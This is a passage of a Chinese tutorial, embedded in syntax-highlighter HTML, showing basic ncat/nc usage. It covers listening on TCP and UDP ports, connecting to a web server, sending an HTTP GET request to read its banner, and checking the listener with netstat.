class=\"crayon-v\">ncat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">port_number</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>比如，<code> </code></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f2967805d1757888655\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ncat -l 8080</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f2967805d1757888655-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f2967805d1757888655-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ncat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8080</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>服务器就会开始在 8080 端口监听入站连接。</p>\n<h3 id=\"toc_2\">例子： 2) 连接远程系统</h3>\n<p>使用下面命令可以用 <code>nc</code> 来连接远程系统，<code> </code></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f2967805d4180365898\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ncat IP_address port_number</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f2967805d4180365898-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f2967805d4180365898-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ncat </span><span class=\"crayon-e\">IP_address </span><span class=\"crayon-v\">port_number</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>让我们来看个例子，<code> </code></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f2967805d7704871403\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ncat 192.168.1.100 80</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f2967805d7704871403-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f2967805d7704871403-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">ncat</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">192.168.1.100</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">80</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>这会创建一个连接，连接到 IP 为 192.168.1.100 的服务器上的 80 端口，然后我们就可以向服务器发送指令了。 比如我们可以输入下面内容来获取完整的网页内容<code> </code></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f2967805db232924950\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nGET / HTTP/1.1</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f2967805db232924950-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f2967805db232924950-1\"><span class=\"crayon-v\">GET</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">HTTP</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">1.1</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>或者获取页面名称，<code> </code></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f2967805de934011703\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nGET / HTTP/1.1</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f2967805de934011703-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f2967805de934011703-1\"><span class=\"crayon-v\">GET</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">HTTP</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">1.1</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>或者我们可以通过以下方式获得操作系统指纹标识，<code> </code></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f2967805e1432339491\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nGET / HTTP/1.1</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f2967805e1432339491-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f2967805e1432339491-1\"><span class=\"crayon-v\">GET</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">HTTP</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">1.1</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>这会告诉我们使用的是什么软件来运行这个 web 服务器的。</p>\n<h3 id=\"toc_3\">例子： 3) 连接 UDP 端口</h3>\n<p>默认情况下，<code>nc</code> 创建连接时只会连接 TCP 端口。 不过我们可以使用 <code>-u</code> 选项来连接到 UDP 端口，<code> </code></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f2967805e5399501742\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ncat -l -u 1234</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f2967805e5399501742-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f2967805e5399501742-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ncat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">u</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1234</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>现在我们的系统会开始监听 UDP 的 1234 端口，我们可以使用下面的 <code>netstat</code> 命令来验证这一点，<code> </code></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f2967805e8517082811\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ netstat -tunlp | grep 1234\r\nudp           0          0 0.0.0.0:1234                 0.0.0.0:*               17341/nc\r\nudp6          0          0 :::1234                      :::*                    17341/nc</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f2967805e8517082811-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f2967805e8517082811-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f2967805e8517082811-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f2967805e8517082811-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">netstat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">tunlp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">grep</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1234</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f2967805e8517082811-2\"><span class=\"crayon-i\">udp</span><span class=\"crayon-h\">           </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">          </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.0.0.0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1234</span><span class=\"crayon-h\">                 </span><span class=\"crayon-cn\">0.0.0.0</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\">               </span><span class=\"crayon-cn\">17341</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">nc</span></div><div class=\"crayon-line\" id=\"crayon-5a6f2967805e8517082811-3\"><span class=\"crayon-i\">udp6</span><span class=\"crayon-h\">          </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">          </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">::</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1234</span><span class=\"crayon-h\">                      </span><span class=\"crayon-o\">::</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\">                    </span><span class=\"crayon-cn\">17341</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">nc</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n<p>假设我们想发送或者说测试某个远程主机 UDP 端口的连通性，我们可以使用下面命令，<code> </code></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f2967805eb523562653\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ncat -v -u {host-ip} {udp-port}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f2967805eb523562653-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f2967805eb523562653-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ncat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">v</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">u</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-v\">host</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">ip</span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span 